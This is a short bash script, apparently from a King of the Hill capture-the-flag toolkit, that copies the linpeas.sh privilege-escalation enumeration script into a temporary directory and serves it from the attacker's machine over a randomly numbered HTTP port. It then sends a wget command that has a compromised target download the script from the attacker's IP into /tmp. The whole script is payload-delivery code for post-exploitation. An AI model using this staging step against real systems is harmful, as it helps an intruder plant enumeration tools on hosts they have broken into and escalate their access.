#!/bin/bash

source "/root/git/koth/scripts/functions.sh"

PORT=$(($RANDOM+3000))
TMPDIR=$(mktemp -d)

hide_guake

cp /root/git/koth/scripts/linpeas.sh $TMPDIR
cd $TMPDIR

python3 -m http.server $PORT &
command "wget $IP:$PORT/linpeas.sh -O /tmp/linpeas.sh"
